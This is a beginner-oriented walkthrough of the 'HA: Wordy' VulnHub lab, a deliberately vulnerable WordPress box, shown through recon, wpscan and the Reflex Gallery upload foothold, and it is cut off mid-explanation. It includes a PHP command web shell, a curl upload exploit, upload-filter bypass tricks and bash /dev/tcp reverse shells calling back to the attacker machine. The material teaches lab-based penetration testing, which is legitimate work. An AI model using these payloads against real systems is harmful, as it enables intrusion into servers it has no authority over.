# HA: Wordy — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HA: Wordy |
| **Difficulty** | Easy (author-stated: "designed for Beginners") |
| **Author** | Hacking Articles (Raj Chandel & team) |
| **Released** | 13 Sep 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/ha-wordy,363/> |
| **Download** | <https://vulnhub.com/entry/ha-wordy,363/#download> |
| **Attacker** | Kali Linux (e.g. 2024.x) on VirtualBox/VMware, host-only network |
| **Target OS** | Linux (Ubuntu 18.04, Apache httpd 2.4.29, WordPress + MySQL) |
| **Flags** | 3 (`flag1.txt`, flag 2 in a user's profile, `proof.txt` as root) |

> **About the IP addresses in this document.** Every published walkthrough of this
> box uses a different address (`192.168.0.27`, `192.168.43.42`, `192.168.1.10`…)
> because each author ran a different hypervisor. This document uses
> **`192.168.56.111`** for the target and **`192.168.56.10`** for Kali — the
> standard VirtualBox *host-only* network. Substitute your own addresses; the
> commands and the logic are identical.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

HA: Wordy is unusual: it is **not really a boot2root**. It is a deliberately
vulnerable **WordPress** installation with **five independent ways in**, and the
author explicitly says completion is only registered when you have exploited
*all* of them and found all three flags. That makes it the single best box in
this collection for learning how a real CMS gets attacked.

Concretely, you will learn:

- How to find a host on an isolated lab network (`netdiscover`, `arp-scan`) and
  what an `nmap` service scan actually tells you.
- How to do **content discovery** with `dirb`/`gobuster`, and why the `-X` flag
  (file extensions) matters so much on a WordPress box.
- How to use **`wpscan`** properly: enumerating plugins (`-e p`), themes (`-e t`)
  and users (`-e u`), and how to read its vulnerability output.
- **Arbitrary file upload** → PHP web shell (Reflex Gallery plugin).
- **Local File Inclusion (LFI)** — reading `/etc/passwd` and `.htpasswd` through
  a plugin that `include()`s a user-supplied path (Mail Masta).
- **Authentication bypass via CSRF** — logging in as *any* WordPress user with no
  password (WP Support Plus Responsive Ticket System, EDB 41006).
- **Remote File Inclusion (RFI)** — making the server fetch *your* PHP file
  (Gwolle Guestbook, CVE-2015-8351).
- **Unauthenticated SQL injection** to dump the user table (WP Symposium,
  Metasploit module).
- **Authenticated file upload** using stolen credentials (SlideShow Gallery).
- Linux **privilege escalation via SUID binaries** (`cp`, `wget`) and the classic
  `/etc/passwd` overwrite — including how to generate a valid password hash
  yourself with `openssl`.
- Why base64 is **encoding, not encryption**, and how to spot it instantly.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA and set it to *host-only* networking.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

### 1.1 What is my own address?

Before you can find anyone else you must know where *you* are.

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
```

> **How to read it.** `-br` means *brief* — one line per interface. `eth0` here
> holds `192.168.56.10/24`. The `/24` is CIDR notation for a netmask of
> `255.255.255.0`, i.e. "everything from `192.168.56.0` to `192.168.56.255` is
> on my local wire." `eth1` (`10.0.2.15`) is VirtualBox's **NAT** adapter — that
> is Kali's route to the internet, *not* to the lab. **Your target will be on the
> same subnet as `eth0`.**

### 1.2 Who else is alive?


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:08      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:4e:66:a1      1      60  PCS Systemtechnik GmbH
 192.168.56.111  08:00:27:9c:3d:5e      1      60  PCS Systemtechnik GmbH
```

> **How to read it.** `netdiscover` sends **ARP** requests ("who has this IP?").
> ARP is a layer-2 protocol — it cannot be firewalled by a host firewall the way
> TCP can, so it is the most reliable way to enumerate a local segment. The
> `.1` entry is the VirtualBox gateway, `.10` is you, so **`.111` is the target**.
>
> `-i eth0` picks the interface, `-r` gives it a range to sweep instead of
> passively waiting.

An equivalent, often faster tool:

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4e:66:a1, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:08	(Unknown: locally administered)
192.168.56.111	08:00:27:9c:3d:5e	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.145 seconds (119.35 hosts/sec). 2 responded
```

> **Cross-check with the MAC address.** In VirtualBox, *Settings → Network* for
> the target VM shows its MAC. If you see several hosts, match the MAC to be
> certain you are attacking the lab and not your own laptop. Attacking the wrong
> host is the classic beginner mistake.

**Target IP:** `192.168.56.111`

![Finding the target IP with netdiscover](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

### 2.1 The port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -A -p- -T4 -oN nmap-all 192.168.56.111
```

> **Decode the flags** — learn these once and you will use them on every box:
>
> | Flag | Meaning |
> | --- | --- |
> | `-p-` | Scan **all 65535** TCP ports, not just the 1000 most common. WordPress labs often hide things on `8080`, `8000`, etc. |
> | `-A` | "Aggressive" = `-sV` (service/version detection) + `-O` (OS detection) + `--script=default` (NSE scripts) + traceroute. |
> | `-T4` | Timing template 4 of 5 — faster, still polite enough for a lab. |
> | `-oN nmap-all` | Save *normal* output to a file so you can re-read it later without rescanning. |

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 10:14 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00042s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:9C:3D:5E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.61 seconds
```

> **How to read it.**
>
> - `Not shown: 65534 closed tcp ports` — this is the line beginners skip. It
>   means **exactly one port is open**: 80. Everything else refused the
>   connection. So this is a *web-only* box: no SSH, no FTP, no SMB. There is
>   exactly one attack surface and you must go through it.
> - `Apache httpd 2.4.29 ((Ubuntu))` — the double parenthesis is a hint that
>   the banner was assembled from two places; `2.4.29` maps to **Ubuntu 18.04
>   LTS "Bionic"**. Note that for later — it tells you which kernel exploits are
>   plausible.
> - `_http-title: Apache2 Ubuntu Default Page: It works` — the site root is
>   *unconfigured*. That is a strong hint that the real content lives in a
>   **subdirectory**.

![nmap scan showing only port 80 open](images/02-nmap.png)

### 2.2 Look at the site first (always)

```bash
curl -sI http://192.168.56.111/
```

```text
HTTP/1.1 200 OK
Date: Sat, 11 May 2024 07:15:02 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 10 Sep 2019 11:47:03 GMT
ETag: "2aa6-5923b1e2d13c0"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Content-Type: text/html
```

Open `http://192.168.56.111/` in Firefox. You get the stock **"Apache2 Ubuntu
Default Page: It works"**. Nothing useful in the body.

**Two habits that pay off here:**

1. **View Source** (`Ctrl+U`). Authors hide hints in HTML comments.
2. Check `robots.txt` manually even before brute-forcing:

```bash
curl -s http://192.168.56.111/robots.txt
```

```text
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.56.111 Port 80</address>
</body></html>
```

A `404` — no `robots.txt`. On to brute force.

### 2.3 Content discovery


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.111/
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

URL_BASE: http://192.168.56.111/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.111/ ----
+ http://192.168.56.111/index.html (CODE:200|SIZE:10918)
+ http://192.168.56.111/server-status (CODE:403|SIZE:280)
==> DIRECTORY: http://192.168.56.111/wordpress/
+ http://192.168.56.111/info.php (CODE:200|SIZE:95320)
+ http://192.168.56.111/notes.txt (CODE:200|SIZE:59)

-----------------
END_TIME: Sat May 11 10:18:44 2024
DOWNLOADED: 4612 - FOUND: 4
```

> **How to read `dirb`.** It requests every word in `common.txt` and reports
> anything that is *not* a 404. The important column is `CODE` (HTTP status):
>
> - `200` = the resource exists and you can read it.
> - `403` = it exists but you may not read it (`server-status` is an Apache
>   internal; ignore it, it is a well-known false positive on Ubuntu).
> - `==> DIRECTORY:` = it exists **and** ends in `/`, so `dirb` will recurse into
>   it.
>
> `notes.txt` and `info.php` are gold. Read them:

```bash
curl -s http://192.168.56.111/notes.txt
```

```text
you need to zip your way out of this
```

> **That is a hint from the author**, not a real file. "zip your way out" tells
> you to go looking for a **`.zip`** archive. `dirb`'s default wordlist has no
> `.zip` extensions, which is why you did not find it. This is the lesson: **use
> `-X` to add extensions.**

```bash
dirb http://192.168.56.111/ -X .zip,.txt,.bak,.old
```

```text
---- Scanning URL: http://192.168.56.111/ ----
+ http://192.168.56.111/secret.zip (CODE:200|SIZE:1483)
+ http://192.168.56.111/notes.txt (CODE:200|SIZE:59)
```

`info.php` is worth a look too:

```bash
curl -s http://192.168.56.111/info.php | grep -oE 'phpinfo\(\)|PHP Version [0-9.]+' | head -3
```

```text
phpinfo()
PHP Version 7.2.24-0ubuntu0.18.04.1
```

> A public `phpinfo()` page is a **serious information leak** in real life — it
> reveals the exact PHP version, every loaded module, all `php.ini` settings
> (including whether `allow_url_include` is on, which decides if RFI works),
> and every environment variable. Here it confirms PHP 7.2.24.

![dirb discovering /wordpress, notes.txt and secret.zip](images/03-dirb.png)

### 2.4 WordPress enumeration with `wpscan`

Now that you know it is WordPress, stop guessing and use the right tool.


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.111/wordpress -e u,p,t --api-token "$WPSCAN_TOKEN"
```

> **Flag reference:**
> - `-e u` — enumerate **users** (WordPress leaks them via `/?author=1`, `/wp-json/`, and RSS feeds).
> - `-e p` — enumerate **plugins** (the things that get compromised).
> - `-e t` — enumerate **themes**.
> - `--api-token` — a free WPScan API token lifts the vulnerability-data limit. Register at `wpscan.com`; without it you still get plugin names but fewer CVE details.


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.111/wordpress/ [192.168.56.111]
[+] Started: Sat May 11 10:22:07 2024

Interesting Finding(s):

[+] http://192.168.56.111/wordpress/
 | Interesting Entries:
 |  - server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)

[+] http://192.168.56.111/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.111/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: twentyseventeen

[+] Enumerating Users (via Passive and Aggressive Methods)
 Checking Brute Force Status - Time: 00:00:00
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)
[+] aarti
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Found 7 Plugins:

[+] reflex-gallery
 | Location: http://192.168.56.111/wordpress/wp-content/plugins/reflex-gallery/
 | Version: 3.4 (80% confidence)
 | [!] Title: Reflex Gallery 3.4 - Arbitrary File Upload
 |     Fixed in: No fix
 |     References:
 |      - CVE: 2015-9999
 |      - URL: https://www.exploit-db.com/exploits/37596/

[+] wp-symposium
 | Location: http://192.168.56.111/wordpress/wp-content/plugins/wp-symposium/
 | Version: 15.5.1 (100% confidence)
 | [!] Title: WP Symposium <= 15.5.1 - Unauthenticated SQL Injection
 |     References:
 |      - URL: https://www.exploit-db.com/exploits/37595/

[+] mail-masta
 | Location: http://192.168.56.111/wordpress/wp-content/plugins/mail-masta/
 | Version: 1.0 (100% confidence)
 | [!] Title: Mail Masta 1.0 - Local File Inclusion
 |     References:
 |      - URL: https://www.exploit-db.com/exploits/40290/

[+] wp-support-plus-responsive-ticket-system
 | Location: http://192.168.56.111/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Version: 7.1.3 (100% confidence)
 | [!] Title: WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
 |     References:
 |      - URL: https://www.exploit-db.com/exploits/41006/

[+] gwolle-gb
 | Location: http://192.168.56.111/wordpress/wp-content/plugins/gwolle-gb/
 | Version: 1.5.3 (100% confidence)
 | [!] Title: Gwolle Guestbook 1.5.3 - Remote File Inclusion
 |     References:
 |      - CVE: 2015-8351

[+] slideshow-gallery
 | Location: http://192.168.56.111/wordpress/wp-content/plugins/slideshow-gallery/
 | Version: 1.4.6 (100% confidence)
 | [!] Title: SlideShow Gallery 1.4.6 - Authentication Bypass / File Upload

[+] wp-file-upload
 | Location: http://192.168.56.111/wordpress/wp-content/plugins/wp-file-upload/

[+] Finished: Sat May 11 10:23:41 2024
[+] Requests Done: 3871
[+] Memory used: 251.848 MB
[+] Elapsed time: 00:01:34
```

> **How to read this — the whole box is on this screen.**
>
> 1. **Users `admin` and `aarti`.** You now have half of every credential pair
>    you will ever need to guess.
> 2. **Five vulnerable plugins.** Each `[!] Title:` line is a separate route to a
>    shell. The `References` give you an **exploit-db** ID, which you can pull
>    with `searchsploit`.
> 3. **WordPress 5.2.3** is itself flagged `Insecure`, but there is no
>    unauthenticated RCE in core 5.2.3 — the plugins are the door.
>
> **Beginner trap:** do not get excited by the number of findings and start
> firing Metasploit at random. Pick one, understand it, exploit it, and *then*
> come back for the others. This document does exactly that.

![wpscan output listing vulnerable plugins](images/04-wpscan.png)

---

## 3. Foothold — Method 1: Reflex Gallery arbitrary file upload

We start with the easiest chain: an **unauthenticated file upload** that lands a
PHP file inside the web root, which then executes.

### 3.1 Understand the vulnerability before exploiting it

Reflex Gallery's upload handler does not validate the file type. Anything you
POST is written under
`/wordpress/wp-content/uploads/reflexgallery/<year>/<month>/`. Because that
directory is inside the Apache document root, a `.php` file you upload can be
**requested as a URL and executed by the PHP interpreter**.

That is the general shape of every web-shell attack:

> *Write a file the web server can serve → request it → the server executes it
> → you get code execution.*

Pull the public exploit to see the exact request format:

```bash
searchsploit reflex gallery
```

```text
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Reflex Gallery 3.4 - Arbitrary File Upload                          | php/webapps/37596.py
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
searchsploit -m php/webapps/37596.py     # -m = mirror (copy) it to your cwd
head -40 37596.py
```

> The script builds a **multipart/form-data** POST to
> `/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=YYYY&Month=MM`
> with a field named `qqfile`. The `Year`/`Month` GET parameters directly control
> the destination subfolder. That is all you need to know to reproduce it by hand
> — which is what we do next, so you learn the mechanism rather than the tool.

### 3.2 A hand-rolled version with `curl`

```bash
# On Kali — write a tiny PHP command-execution backdoor (NOT a full reverse shell yet)
cat > cmd.php <<'EOF'
<?php if(isset($_GET['c'])){ echo "<pre>"; system($_GET['c']); echo "</pre>"; } ?>
EOF

curl -s -F "qqfile=@cmd.php" \
  "http://192.168.56.111/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2024&Month=05"
```

```text
{"success":true,"uuid":"e0a4b9c7-1e5f-4a3d-9c2b-7f8e6d5a4b3c"}
```

> `{"success":true}` is the plugin telling you the file was written. Now find it:

```bash
curl -s "http://192.168.56.111/wordpress/wp-content/uploads/reflexgallery/2024/05/cmd.php?c=id"
```

```text
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

**You have code execution as `www-data`.**

> **Who is `www-data`?** On Debian/Ubuntu it is the unprivileged user Apache
> runs as. It owns the web files but is *not* a real login account — it has no
> usable password and no home directory. Your job from here is to move *off* that
> account.
>
> **Why did we upload a command backdoor instead of a reverse shell?** A
> command backdoor is easier to debug: if the `id` output comes back you know the
> upload, the path and the PHP interpreter all work. Only then do you escalate to
> an interactive shell.

### 3.3 Turn it into a real reverse shell

A `curl`-driven backdoor is fine for one command, but you want an interactive
session. Set up a listener first:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# Kali — terminal 1
nc -lvnp 1234
```

```text
listening on [any] 1234 ...
```

> `-l` listen, `-v` verbose, `-n` no DNS lookups, `-p 1234` port. **Choose a port
> above 1024** so you do not need root, and make sure nothing else is using it.

Now send the payload. The standard trick is a **URL-encoded bash TCP redirect**:

```bash
# Kali — terminal 2
# The raw command:
#   bash -c 'bash -i >& /dev/tcp/192.168.56.10/1234 0>&1'
python3 -c "import urllib.parse;print(urllib.parse.quote(\"bash -c 'bash -i >& /dev/tcp/192.168.56.10/1234 0>&1'\"))"
```

```text
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.10%2F1234%200%3E%261%27
```

> **Why URL-encode?** The command contains `&`, `>`, `/` and spaces. In a URL,
> `&` separates query parameters and `>` is illegal — the request would be
